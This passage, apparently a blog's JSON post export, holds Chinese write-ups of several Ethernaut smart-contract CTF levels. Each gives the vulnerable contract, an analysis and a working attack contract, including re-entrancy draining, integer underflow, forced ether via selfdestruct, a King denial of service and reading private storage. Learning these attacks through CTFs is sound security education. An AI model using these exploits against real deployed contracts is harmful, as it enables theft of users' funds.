&quot;failed&quot;); &#125; &#125; 3. 解题 3.1 获取关卡实例地址：0xf0f0bbA56D2035804D70D9Ed802e422195b62134 3.2 通过传入实例的地址部署攻击合约 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Force","slug":"CTFS/ethernaut/Force","date":"2023-01-09T03:32:10.000Z","updated":"2023-01-09T03:32:10.000Z","comments":true,"path":"2023/01/09/CTFS/ethernaut/Force/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/CTFS/ethernaut/Force/","excerpt":"","text":"Force1. 题目要求 1.1 题目： 这一关的目标是使合约的余额大于0 这可能有帮助: Fallback 方法 有时候攻击一个合约最好的方法是使用另一个合约. 阅读上方的帮助页面, “Beyond the console” 部分 1.2 要求： 使合约的余额大于0 1.3 合约代码： 123456789101112// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force &#123;/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m)*/&#125; 2. 分析 2.1 我看到这个合约首先是挺无语的哈哈哈哈🤣🤣🤣 2.2 合约中没有没有fallback和receive函数接收以太，也没有任何一个payable的函数可以接收以太，所以我们只能强制给该合约打钱 2.3 由于合约中什么都没有，所以我们唯一能解决这个挑战的就是使用方法selfdestruct() 2.4 selfdestruct()函数的解释： selfdestruct命令可以用来删除智能合约，并将该合约剩余ETH转到指定地址。selfdestruct是为了应对合约出错的极端情况而设计的。它最早被命名为suicide（自杀），但是这个词太敏感。为了保护抑郁的程序员，改名为selfdestruct。 selfdestruct() 函数的使用： 2.5 攻击合约 123456contract Exploiter &#123; constructor(address payable _to) public payable &#123; // 自毁时将所有的 `msg.value` 重定向到 `to` selfdestruct(_to); &#125; &#125; 部署Exploiter合约, 构造器默认将Expoliter合约的余额转给 _to 地址 3. 解题 3.1 获取关卡实例地址：0x896317e85Fb12eA5bAD846A59870f3F672fAB7A4 3.2 部署攻击合约，并在部署时填入关卡实例地址 3.3 调用Deploy() 函数 3.4 调用实例部署的合约查看合约余额，结果 balance &gt; 0 3.5 提交案例，并查看返回结果 3.6 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Gatekeeper One","slug":"CTFS/ethernaut/Gatekeeper One","date":"2023-01-09T03:02:15.000Z","updated":"2023-01-09T03:02:15.000Z","comments":true,"path":"2023/01/09/CTFS/ethernaut/Gatekeeper One/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/CTFS/ethernaut/Gatekeeper%20One/","excerpt":"","text":"Gatekeeper One1. 题目要求 1.1 越过守门人并且注册为一个参赛者来完成这一关. 这可能有帮助: 想一想你在 Telephone 和 Token 关卡学到的知识. 你可以在 solidity 文档中更深入的了解 gasleft() 函数 (参见 here 和 here). 1.2 题目代码 1234567891011121314151617181920212223242526272829// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperOne &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(gasleft() % 8191 == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;); require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; 2.分析tips：参考博客 2.1让我们把解释分成三个不同的部分 门 1：msg.sender和tx.origin 要打开这扇门，我们必须了解msg.sender它们tx.origin之间的区别。 让我们看看 Solidity 文档对这些全局变量的看法： msg.sender( address): 消息的发送者（当前通话） tx.origin( address): 交易的发送方（完整的调用链） 当交易由 EOA 进行并直接与智能合约交互时，这些变量将具有相同的值。但是，如果它与中间人合约交互A，然后B通过直接调用（而不是 a delegatecall）与另一个合约交互，那么这些值将不同。 在这种情况下： msg.sender将有 EOA 地址 tx.origin``A将有合同的地址 因为为了gateOne不恢复，我们需要让msg.sender != tx.origin这意味着我们必须enter从智能合约而不是直接从玩家的 EOA 调用。 这不是挑战的一部分，但我建议您阅读我在进一步阅读中列出的关于一些安全问题和最佳实践tx.orgin以及何时不应使用它的内容。 2号门：gasleft() 从关于全局变量的 Solidity 文档中我们知道这是一个返回交易剩余气体gasleft() returns (uint256)的函数。 重要的是要知道每个 Solidity 指令实际上是一系列低级 EVM 操作码的高级表示。执行操作码后GAS（在EVM 代码文档站点上阅读更多内容），返回值是执行后剩余的气体量，也是GAS当前消耗2 gas的操作码。 事情在这里变得过于复杂，因为要通过检查，gateTwo您必须调用level.enter&#123;gas: exactAmountOfGas&#125;(gateKey)非常特定数量的气体，以便gasleft().mod(8191)返回0（剩余的气体必须是 8191 的倍数）。 你猜不到这个数字，因为你需要翻译 EVM 操作码中的所有 Solidity 代码，计算它们各自消耗的 gas 并浪费大量时间（除非你的目标也是掌握 EVM，但对于这个主题有还有大量其他资源，例如让我们玩 EVM 谜题——边玩边学习以太坊 EVM！）。您还需要记住，gas 成本可能会有所不同，具体取决于使用哪个 Solidity 编译器版本将代码编译为字节码以及在此过程中使用了哪些编译标志。一团糟。 我们可以做什么？好吧，我们可以用简单的方法去暴力破解它！按照cmichel 的建议，我们可以利用我们正在使用本地测试环境（或分叉的环境）这一事实。 我们知道交易使用的 gasenter必须至少为 8191 加上执行这些操作码所花费的所有 gas。我们可以进行范围猜测并对其进行暴力破解，直到它起作用为止。这是代码示例： 123456for (uint256 i = 0; i &lt;= 8191; i++) &#123; try victim.enter&#123;gas: 800000 + i&#125;(gateKey) &#123; console.log(&quot;passed with gas -&gt;&quot;, 800000 + i); break; &#125; catch &#123;&#125;&#125; 你从一个基本的 gas 值开始只是为了确保交易不会因为 Out of Gas 异常而恢复，然后你试图找到哪个 gas 值可以使交易成功。 在我们的例子中（solidity 编译器 + 优化标志）正确的 gas 值是：802929 关卡 3：铸造如何在 Solidity 中工作 要解决最终关口，我们首先需要了解从一种类型到另一种类型的转换以及向下转换的工作原理。Solidity 文档对其进行了很好的解释： Solidity 文档：基本类型之间的转换 Solidity 文档：文字和基本类型之间的转换 当您从较小的类型转换为较大的类型时，没有问题。所有的高位都用零填充，值不变。问题是当您将较大的类型转换为较小的类型时。根据值的不同，您可能会遇到数据丢失的情况，因为那些高阶位会丢失并被截断。例如，uint16(0x0101)是257十进制的，但如果你向下转换它，uint8它将是1十进制的！ 2.2 参考视频 写的攻击合约 12345678910111213141516interface IGateKeeperOne &#123; function entrant() external view returns (address); function enter(bytes8) external returns (bool);&#125;contract Hack &#123; function enter (address _target, uint256 gas) external &#123; IGateKeeperOne target = IGateKeeperOne(_target); uint16 k16 = uint16(uint160(tx.origin)); uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16); bytes8 key = bytes8(k64); require(gas &lt; 8191, &quot;gas &gt; 8191&quot;); require(target.enter&#123;gas: 8191 * 10 + gas&#125;(key), &quot;failed&quot;); &#125;&#125; 3.解题 3.1 获取关卡实例地址：0xAd682B7a072dc407361a23D0C9Ee9f1C16dEa187 3.2 部署攻击合约，调用enter() 函数，将关卡实例地址传入enter() 函数中，并设置gas &#x3D; 256 3.3 提交案例 3.4 成功！！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Privacy","slug":"CTFS/ethernaut/Privacy","date":"2023-01-09T02:16:15.000Z","updated":"2023-01-09T02:16:15.000Z","comments":true,"path":"2023/01/09/CTFS/ethernaut/Privacy/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/CTFS/ethernaut/Privacy/","excerpt":"","text":"Privacy1. 题目要求 1.1 这个合约的制作者非常小心的保护了敏感区域的 storage.解开这个合约来完成这一关.这些可能有帮助: 理解 storage 的原理 理解 parameter parsing 的原理 理解 casting 的原理 1.2 题目代码： 12345678910111213141516171819202122232425262728293031// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Privacy &#123; bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(block.timestamp); bytes32[3] private data; constructor(bytes32[3] memory _data) &#123; data = _data; &#125; function unlock(bytes16 _key) public &#123; require(_key == bytes16(data[2])); locked = false; &#125; /* A bunch of super advanced solidity algorithms... ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^` .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*., *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^ ,---/V\\ `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*. ~|__(o.o) ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27; UU UU */&#125; 2. 分析 2.1 目标：将locked修改为false bool public locked初始化为 true 并保存必须设置为 false 才能赢得挑战的值 bytes32[3] private data是存储我们的密钥的变量。我们需要找出data[2]解决挑战的价值 2.2 我们可以将所有其他变量仅视为“存储填充”，以达到我们想要读取的内容 ( data[2]) 以解决挑战。 constructor(bytes32[3] memory _data)初始化data变量的值 然后我们只需检查我们传递的输入unlock(bytes16 _key)是否与值匹配。如果比较返回 true，我们就解锁了合约，通过了挑战。byte16 _key``data[2]``true 2.3 data首先，必须检索变量中的数据。这可以通过从区块链上的合约存储中提取数据来完成。在 brownie 中，这可以使用 来完成web3.eth.getStorageAt()，第一个参数是合约的地址，以及要查看的合约存储槽的方向。每个槽的容量为 32 字节（256 位），这意味着实际填满 32 字节槽的数据类型将占用整个槽，因此后续数据类型将滚动到下一个槽。如果数据类型声明为uint256或bytes32，它将始终占用一个完整的存储槽，因为这些类型的大小已经是 32 字节。 在隐私合约的情况下，我们知道相关数据是数组的最后一个元素data。因此，要提取这个，我们必须确定这条数据在哪里，在什么存储槽中。 2.4 参考博客 2.5 在浏览器控制台依次执行 web3.eth.getStorageAt() ** ，data.slice(0,34)** 命令 3 .解题 3.1 获取关卡实例地址：0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0 3.2 依次执行如下代码得到 data[2] addr = &quot;0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0&quot; &#39;0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0&#39; await web3.eth.getStorageAt(addr, 5) &#39;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&#39; data = &quot;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&quot; &#39;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&#39; data.slice(0,34) &#39;0xa9cbb829703de0df913fc95cc78d10df&#39; 3.3 调用实例部署的合约，并查看locked 的值为true 3.4 将执行data.slice(0,34) 得到的值传入unlock的形参中，并调用unlock() 函数 3.5 查看locked的值，值由true 变成 false 3.6 提交实例 3.7 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Delegate","slug":"CTFS/ethernaut/Delegate","date":"2023-01-09T01:32:10.000Z","updated":"2023-01-09T01:32:10.000Z","comments":true,"path":"2023/01/09/CTFS/ethernaut/Delegate/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/CTFS/ethernaut/Delegate/","excerpt":"","text":"Delegate1. 题目要求 1.1 这一关的目标是申明你对你创建实例的所有权. 这可能有帮助 仔细看solidity文档关于 delegatecall 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响. Fallback 方法 方法 ID 1.2 题目代码： 123456789101112131415161718192021222324252627282930313233// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123; address public owner; constructor(address _owner) &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125;&#125;contract Delegation &#123; address public owner; Delegate delegate; constructor(address _delegateAddress) &#123; delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; fallback() external &#123; (bool result,) = address(delegate).delegatecall(msg.data); if (result) &#123; this; &#125; &#125;&#125; 2. 分析 2.1 elegation.sol 这是我们可以直接访问的合约。让我们来看看。它有两个状态变量： address public owner存储合约所有者的公共变量 Delegate delegate``Delegate对我们刚刚看到的合同的引用 合约constructor的 将其address _delegateAddress作为唯一的输入参数，delegate用它初始化状态变量并用 初始化所有者msg.sender 2.2 通过修改燃料限制的方法，出错了。。。 开始网上寻找解决方法，解决方法：修改编辑燃料费选项为 “高级” 3. 解题 3.1 获取关卡实例地址：0x6eE471bd0AE8A991C76972ADB0365D7cfC4e3fE9 3.2 通过实例地址调用合约 3.3 调用Dlegate合约中的 pwn()函数，将燃料限制从29328修改为39328 3.3 发现做错了 wwww….. 弄了好久，原来是需要修改编辑燃料费选项, 将其设置为“高级” 3.4 再次调用pwn() 函数，地址修改成功 3.5 到EtherScan 查看交易记录，发现成功调用pwn函数 3.6 提交实例并查看结果 3.7 成功！！！！ tips：1.参考博客 2. 参考视频","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Elevator","slug":"CTFS/ethernaut/Elevator ","date":"2023-01-08T13:16:15.000Z","updated":"2023-01-08T13:16:15.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Elevator /","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Elevator%20/","excerpt":"","text":"Elevator1. 题目要求 1.1 电梯不会让你达到大楼顶部, 对吧? 这可能有帮助: 有的时候 solidity 不是很擅长保存 promises. 这个 电梯 期待被用在一个 建筑 里. 1.2 题目代码： 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building &#123; function isLastFloor(uint) external returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125; 2. 分析tips： 参考博客 2.1 isLastFloor()的返回值必须为 False 才能floor更改并变为toptrue。我想到了两种方法： 我们让我们的顶层不是 0（ 的起始值floor）并且我们检查是否floor是顶层的数值。然后我们定义函数返回当前值和顶层值isLastFloor()之间的比较。floor 我们创建了一个将电梯发送到其当前楼层 (0) 的函数，但我们运行此函数两次，第一次，我们确保返回isLastFloor()false，然后仅返回 true。这实际上意味着我们的顶层是 0 层。但是在第二次运行期间，top变成了真的。 2.2 参考视频 写的攻击合约 123456789101112131415161718contract Hack &#123; Elevator private immutable target; uint private count; constructor(address _target) &#123; target = Elevator(_target); &#125; function pwn() external &#123; target.goTo(1); require(target.top(), &quot;not top&quot;); &#125; function isLastFloor(uint) external returns (bool) &#123; count++; return count &gt; 1; &#125;&#125; 3. 解题 3.1 获取关卡实例地址： 0x156b4F96D63961020a9fe45947d4eAB6F4053aA8 3.2 通过实例地址部署攻击合约： 3.3 调用pwn() 函数 3.4 提交实例查看结果 3.5 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Re-entrancy","slug":"CTFS/ethernaut/Re-entrancy","date":"2023-01-08T10:13:13.000Z","updated":"2023-01-08T10:13:13.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Re-entrancy/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Re-entrancy/","excerpt":"","text":"Re-entrancy1. 题目要求 1.1 这一关的目标是偷走合约的所有资产. 这些可能有帮助: 不可信的合约可以在你意料之外的地方执行代码. Fallback methods 抛出&#x2F;恢复 bubbling 有的时候攻击一个合约的最好方式是使用另一个合约. 查看上方帮助页面, “Beyond the console” 部分 1.2 题目代码： 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Reentrance &#123; using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] = balances[_to].add(msg.value); &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); if(result) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; receive() external payable &#123;&#125;&#125; 2. 分析tips: 参考博客 2.1 分析代码 function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); if(result) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 - a.该功能检查是否`msg.sender`有足够的余额来提取`_amount`以太币 - b.`_amount`它继续通过一个低级函数发送请求，`call`该函数将使用所有剩余的`gas`来执行操作 - c.它更新`msg.sender`减少金额的余额- `**漏洞利用选项 1，懒惰而不聪明的选项：在循环中利用重入** 如果资金不是问题，我们可以`0.001 ether / 100`通过`donate`函数发送并重新进入`withdraw`函数 100 次 + 初始调用。 `0.001 ether / 100`只是一个任意值，我们只需要确保在重新进入函数时不会消耗太多气体，`withdraw`否则交易会因为**Out of Gas 异常**而恢复。 **漏洞利用选项 2，切肉刀方式：利用重入和下溢** 这个解决方案要优雅得多，它利用了两个不同的问题：重入和下溢！ 我们已经知道重入问题，并且我们说`balances[msg.sender] -= _amount`“正常”操作的下溢将受到保护，因为`balances[msg.sender] &gt;= _amount`即使该操作不使用`SafeMath`，如果我们确定 max，也没有办法下溢可能`balances[msg.sender]`会**归零**。 但是因为我们可以重新输入，所以我们可以执行两次相同的`balances[msg.sender] -= _amount`操作，所以我们的余额第一次会变为零，但第二次会`type(uint256).max`因为下溢而变为零！ 此时，我们可以调用`withdraw`提取存储在受害者合约中的全部以太币！ **注意：**第二种解决方案**只有**在下溢的情况下才有可能。如果不存在下溢问题，我们仍然可以通过重入循环解决方案来解决挑战。`- 2.2 [参考视频](https://www.youtube.com/watch?v=K8AFyNiuTXs) 写的攻击合约:- ```solidity interface IReentracy &#123; function donate(address) external payable; function withdraw(uint256) external; &#125; contract Hack&#123; IReentracy private immutable target; constructor(address _target) public &#123; target = IReentracy(_target); &#125; function attack() public payable&#123; target.donate.value(0.001 ether)(address(this)); target.withdraw(1e18); &#125; receive() external payable &#123; uint amount = min(1e18, address(target).balance); if (amount &gt; 0) &#123; target.withdraw(amount); &#125; require(address(target).balance == 0, &quot;target balance &gt; 0&quot;); selfdestruct(payable(msg.sender)); &#125; function min(uint x, uint y) private pure returns(uint) &#123; return x &lt;= y ? x : y; &#125; &#125; 2.3 进行重入攻击即可 3. 解题 3.1 获取关卡的实例：0xcf96fB43ffF6B6F8c05f353ce8271931271E69b0 3.2 利用实例地址部署Hack合约，调用attrack() 函数 设置msg.value &#x3D; 1 ether 3.3 提交实例并查看结果 3.4 成功！！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"King","slug":"CTFS/ethernaut/King","date":"2023-01-08T08:17:13.000Z","updated":"2023-01-08T08:17:13.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/King/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/King/","excerpt":"","text":"King1. 题目要求 1.1 题目：下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.这么有趣的游戏, 你的目标是攻破他, 当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关. 1.2 题目代码： 1234567891011121314151617181920212223242526// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract King &#123; address king; uint public prize; address public owner; constructor() payable &#123; owner = msg.sender; king = msg.sender; prize = msg.value; &#125; receive() external payable &#123; require(msg.value &gt;= prize || msg.sender == owner); payable(king).transfer(msg.value); king = msg.sender; prize = msg.value; &#125; function _king() public view returns (address) &#123; return king; &#125;&#125; 2. 分析tips：参考博客 2.1 阅读代码可知，该receive函数是一个特殊函数，允许合约直接从外部合约或 EOA 接收以太币 2.2 我们首先看到的是require(msg.value &gt;= prize || msg.sender == owner)。此检查允许owner合约的 始终拥有合约的王权，重置所有值。 2.3 所以现在我们知道transfer允许您将 Ether 发送到一个地址，消耗2300gas 并在无法执行交易时恢复。 如果“将以太币转移到”交易恢复，为什么会出现问题？好吧，因为如果还原，我们的功能transfer也会还原！并且通过还原它会使合约无法使用，没有人可以成为新的国王！receive 一种可能的解决方案是只创建一个Contract不接受任何类型的 Ether 转移的对象。 2.4 攻击合约 123456contract Exploiter &#123; constructor(address payable _to) payable &#123; (bool success, ) = address(_to).call&#123;value: msg.value&#125;(&quot;&quot;); require(success, &quot;call failed!!!&quot;); &#125; &#125; 2.5 获取实例地址，并填入到Exploiter合约构造器中 3. 解题 3.1 获取关卡实例地址：0x25766108F8Fa65C8061FB17E7762D4BC42Fc882C 3.2 调用关卡实例部署的合约，得到实例合约中的prize 3.3 根据关卡实例地址部署攻击合约 3.4 Deploy后查看king的值发生了改变 3.5 提交实例 3.6 成功！！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Vault","slug":"CTFS/ethernaut/Vault","date":"2023-01-08T07:10:10.000Z","updated":"2023-01-08T07:10:10.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Vault/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Vault/","excerpt":"","text":"1.题目要求 1.1 要求 ：打开 vault 来通过这一关! 题目代码： 123456789101112131415161718// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123; bool public locked; bytes32 private password; constructor(bytes32 _password) &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125;&#125; 2. 分析 2.1 在区块链上使用或开发时，首先要记住的是，区块链中没有任何东西是私有的。即使您将变量声明为private或 ，也可以看到所有内容internal 2.2 状态变量存储在合约存储中，因为变量password是一个 32 字节的数据，它总是会填满整个槽，使得它在合约的第二个槽中的位置非常可预测，因为第二个状态变量定义。 在这种情况下，我们可以很容易地使用web3.pygetstorageat()上的功能，通过在第二个存储槽中查找来查看密码是什么。然后我们可以选择将其转换为文本以查看密码是什么。 2.3 在浏览器控制台上执行 * await web3.eth.getStorageAt(contract.address,1) * 命令 获取password 然后在 关卡实例部署的合约上输入获取到的 password 3. 解题 3.1 获取关卡实例地址：0x3741430AB42C816Dbbe583001C9615049ad09e31 3.2 执行 *await web3.eth.getStorageAt(contract.address,1) * 得到password ：0x412076657279207374726f6e67207365637265742070617373776f7264203a29 调用实例部署 的合约,并调用合约的 unlock() 函数： 3.3 对比调用 unlock() 函数之后locked 的值 3.4 提交案例并查看结果 3.5 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Token","slug":"CTFS/ethernaut/Token","date":"2023-01-08T06:30:10.000Z","updated":"2023-01-08T06:30:10.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Token/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Token/","excerpt":"","text":"Token1. 题目要求 1.1 这一关的目标是攻破下面这个基础 token 合约 1.2 你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好 1.3 合约代码： 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public &#123; balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; return balances[_owner]; &#125;&#125; 2. 分析 2.1 编译器版本：^0.6.0，且没用SafeMath库，所以可能出现整数溢出漏洞 2.2 代码分析： require(balances[msg.sender] - _value &gt;= 0);检查用户余额是否大于或等于零，但由于余额是无符号整数，当我们减去的数字 ( _value) 大于代balances[msg.sender]币的钱包余额 ( ) 时，就会发生溢出，钱包余额变为最大无符号整数减去这两个值之间的差值。 通过 require 语句后，还有一个错误是将这个溢出的值赋值给 的余额msg.sender： 2.3 攻击合约： 12345678910contract Hack &#123; function attarck() public &#123; // 实例地址 Token token = Token(0x03130C8ca692f8980461A9C96411aAf5e0A71AcB); // 自己的钱包地址 token.transfer(0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8,100); &#125;&#125; 2.4 调用Hack 合约中的 attract() 函数 3. 解题 3.1 获取关卡实例地址：0x03130C8ca692f8980461A9C96411aAf5e0A71AcB 3.2 部署攻击合约 3.3 查看我的钱包地址的余额 3.4 开始合约攻击，并查看余额 3.5 提交实例，返回结果，成功！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Telephone","slug":"CTFS/ethernaut/Telephone","date":"2023-01-08T04:47:10.000Z","updated":"2023-01-08T04:47:10.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Telephone/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Telephone/","excerpt":"","text":"1. 题目要求 要求： 获取合约的所有权 合约代码： 1234567891011121314151617// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123; address public owner; constructor() &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; 2. 分析 2.1 状态owner变量在constructor，唯一会更新owner的函数是 changeOwner(),它是一个只接受一个参数的公共函数address 